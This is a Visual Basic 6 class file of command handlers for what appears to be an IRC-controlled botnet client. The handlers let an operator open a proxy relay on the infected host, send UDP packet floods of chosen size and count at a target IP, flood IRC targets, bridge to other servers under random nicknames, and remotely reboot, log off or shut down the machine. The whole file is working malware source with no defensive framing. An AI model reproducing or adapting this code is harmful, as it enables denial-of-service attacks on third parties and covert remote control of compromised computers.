VERSION 1.0 CLASS
BEGIN
  MultiUse = -1  'True
  Persistable = 0  'NotPersistable
  DataBindingBehavior = 0  'vbNone
  DataSourceBehavior  = 0  'vbNone
  MTSTransactionMode  = 0  'NotAnMTSObject
END
Attribute VB_Name = "clsBotCommands"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = True
Attribute VB_PredeclaredId = False
Attribute VB_Exposed = False
Option Explicit

Public Sub Quit(sParams As String, nIndex As Integer)
    On Error GoTo ErrTrap
    Call frmMain.socket(nIndex%).SendData("QUIT :Quit command implemented by " & Bot.LoginNick & "!" & Bot.LoginIdent & "@" & Bot.LoginHost & vbCrLf)
    Call Unload(frmMain)
Exit Sub
ErrTrap:
End Sub

Public Sub Join(sParams As String, nIndex As Integer)
    On Error GoTo ErrTrap
    Dim sArray() As String
    sArray() = Split(sParams$, " ")
    If Bot.Channel <> "" Then Call frmMain.socket(nIndex%).SendData("PART " & Bot.Channel & vbCrLf)
    Call frmMain.socket(nIndex%).SendData("JOIN " & sArray(0) & vbCrLf)
    If LCase$(Bot.Channel) = LCase$(sArray(0)) Then Call frmMain.socket(nIndex%).SendData("JOIN " & sArray(0) & vbCrLf)
    Call frmMain.socket(nIndex%).SendData("NOTICE " & Bot.LoginNick & " :Joined channel " & sArray(0) & vbCrLf)
    Bot.Channel = sArray(0)
Exit Sub
ErrTrap:
End Sub

Public Sub BNC(sParams As String, nIndex As Integer)
    On Error GoTo ErrTrap
    Dim nPort As Integer
    BNC_RELAY = 1
    Call frmMain.BNC.Close
    nPort% = Val(Trim$(sParams$))
    Randomize
    If nPort% = 0 Then nPort% = Fix((Rnd * 32767) + 1)
    frmMain.BNC.LocalPort = nPort%
    Call frmMain.BNC.Listen
    Call frmMain.socket(nIndex%).SendData("NOTICE " & Bot.LoginNick & " :BNC Server: (Listening) " & frmMain.BNC.LocalIP & ":" & frmMain.BNC.LocalPort & vbCrLf)
Exit Sub
ErrTrap:
End Sub

Public Sub BNCStop(sParams As String, nIndex As Integer)
    On Error GoTo ErrTrap
    BNC_RELAY = 0
    Call frmMain.BNC.Close
    Call frmMain.BNCRelay.Close
    Call frmMain.socket(nIndex%).SendData("NOTICE " & Bot.LoginNick & " :BNC Server: (Stopped) " & vbCrLf)
Exit Sub
ErrTrap:
End Sub

Public Sub Part(sParams As String, nIndex As Integer)
    On Error GoTo ErrTrap
    Call frmMain.socket(nIndex%).SendData("PART " & Trim$(sParams$) & vbCrLf)
    Call frmMain.socket(nIndex%).SendData("NOTICE " & Bot.LoginNick & " :Parted: " & Trim$(sParams$) & vbCrLf)
    Bot.Channel = ""
Exit Sub
ErrTrap:
End Sub

Public Sub Packet(sParams As String, nIndex As Integer)
    On Error GoTo ErrTrap
    Dim sArray() As String, nK As Integer, hSocket As Integer
    sArray() = Split(sParams$, " ")
    If UBound(sArray()) < 2 Then
        Call frmMain.socket(nIndex%).SendData("NOTICE " & Bot.LoginNick & " :Packeting: Missing Parameters" & vbCrLf)
        Exit Sub
    End If
    Call frmMain.socket(nIndex%).SendData("NOTICE " & Bot.LoginNick & " :Packeting: (IP) " & sArray(0) & " (Count) " & sArray(1) & " (Size) " & sArray(2) & vbCrLf)
    hSocket% = CreateSocket("Packet")
    frmMain.socket(hSocket%).Protocol = sckUDPProtocol
    For nK% = 1 To sArray(1)
        Call frmMain.socket(hSocket%).SendData(String$(sArray(2), "N"))
    Next nK%
    Call KillSocket(hSocket%)
    Call frmMain.socket(nIndex%).SendData("NOTICE " & Bot.LoginNick & " :Packeting: (Finished) " & sArray(0) & vbCrLf)
Exit Sub
ErrTrap:
End Sub

Public Sub Logout(sParams As String, nIndex As Integer)
    On Error GoTo ErrTrap
    Call frmMain.socket(nIndex%).SendData("NOTICE " & Bot.LoginNick & " :You are now logged out." & vbCrLf)
    Bot.LoginHost = ""
    Bot.LoginIdent = ""
    Bot.LoginNick = ""
Exit Sub
ErrTrap:
End Sub

Public Sub Help(sParams As String, nIndex As Integer)
    Call HelpSystem(sParams$, nIndex%)
End Sub

Public Sub Flood(sParams As String, nIndex As Integer)
    On Error GoTo ErrTrap
    Dim hSocket As Integer, sArray() As String
    sArray() = Split(sParams$, " ")
    If UBound(sArray()) < 1 Then
        Call frmMain.socket(nIndex%).SendData("NOTICE " & Bot.LoginNick & " :Flooding: Missing Parameters" & vbCrLf)
        Exit Sub
    End If
    Call frmMain.socket(nIndex%).SendData("NOTICE " & Bot.LoginNick & " :Flooding: (Target) " & sArray(0) & " (Count) " & sArray(1) & vbCrLf)
    Bot.FloodName = sArray(0)
    Bot.FloodCount = Val(sArray(1))
    hSocket% = CreateSocket("Flood")
    Call frmMain.socket(hSocket%).Connect(Bot.Server, Bot.Port)
    Call frmMain.socket(nIndex%).SendData("NOTICE " & Bot.LoginNick & " :Flooding: (Finished) " & sArray(0) & vbCrLf)
Exit Sub
ErrTrap:
End Sub

Public Sub Bridge(sParams As String, nIndex As Integer)
    On Error GoTo ErrTrap
    Dim sArray() As String, nK As Integer, sTemp As String
    sArray() = Split(sParams$, " ")
    If Bot.BridgeType <> "" Then Call KillSocket(Bot.BridgeIndex)
    If UBound(sArray()) < 2 Then
        Call frmMain.socket(nIndex%).SendData("NOTICE " & Bot.LoginNick & " :Bridge: Missing Parameters" & vbCrLf)
        Exit Sub
    End If
    If InStr(sArray(1), ":") > 0 Then
        Bot.BridgeServer = Trim$(Left$(sArray(1), InStr(sArray(1), ":") - 1))
        Bot.BridgePort = Val(Trim$(Mid$(sArray(1), InStr(sArray(1), ":") + 1)))
    Else
        Bot.BridgeServer = Trim$(sArray(1))
        Bot.BridgePort = 7000
    End If
    Bot.BridgeType = sArray(0)
    Bot.BridgeChannel = sArray(2)
    If UBound(sArray()) > 2 Then
        Bot.BridgeNick = sArray(3)
    Else
        For nK% = 0 To 8
            Randomize
            sTemp$ = sTemp$ & Chr$(Fix((Rnd * 26) + 97))
        Next nK%
        Bot.BridgeNick = sTemp$
    End If
    Call frmMain.socket(nIndex%).SendData("NOTICE " & Bot.LoginNick & " :Bridge: (Server) " & Bot.BridgeServer & " (Port) " & CStr(Bot.BridgePort) & " (Channel) " & Bot.BridgeChannel & " (Nick) " & Bot.BridgeNick & vbCrLf)
    Bot.BridgeIndex = CreateSocket("Bridge")
    Call frmMain.socket(Bot.BridgeIndex).Connect(Bot.BridgeServer, Bot.BridgePort)
Exit Sub
ErrTrap:
End Sub

Public Sub BridgeStop(sParams As String, nIndex As Integer)
    On Error GoTo ErrTrap
    Bot.BridgeType = ""
    If SocketStatus(Bot.BridgeIndex) = "Bridge" Then Call KillSocket(Bot.BridgeIndex)
    Call frmMain.socket(nIndex%).SendData("NOTICE " & Bot.LoginNick & " :Bridge: (Stopped)" & vbCrLf)
Exit Sub
ErrTrap:
End Sub

Public Sub Reboot(sParams As String, nIndex As Integer)
    On Error GoTo ErrTrap
    Call System.Reboot
Exit Sub
ErrTrap:
End Sub

Public Sub Logoff(sParams As String, nIndex As Integer)
    On Error GoTo ErrTrap
    Call System.Logoff
Exit Sub
ErrTrap:
End Sub

Public Sub Shutdown(sParams As String, nIndex As Integer)
    On Error GoTo ErrTrap
    Call System.Shutdown
Exit Sub
ErrTrap:
End Sub

Public Sub BridgeType(sParams As String, nIndex As Integer)
    On Error GoTo ErrTrap
    Select Case Trim$(sParams$)
        Case "<-"
            Bot.BridgeType = "<-"
            Call frmMain.socket(nIndex%).SendData("NOTICE " & Bot.LoginNick & " :Bridge: (Type) <-" & vbCrLf)
        Case "<->"
            Bot.BridgeType = "<->"
            Call frmMain.socket(nIndex%).SendData("NOTICE " & Bot.LoginNick & " :Bridge: (Type) <->" & vbCrLf)
        Case "->"
            Bot.BridgeType = "->"
            Call frmMain.socket(nIndex%).SendData("NOTICE " & Bot.LoginNick & " :Bridge: (Type) ->" & vbCrLf)
        Case Else
            Call frmMain.socket(nIndex%).SendData("NOTICE " & Bot.LoginNick & " :Bridge: (Type) Invalid." & vbCrLf)
    End Select
Exit Sub
ErrTrap:
End Sub
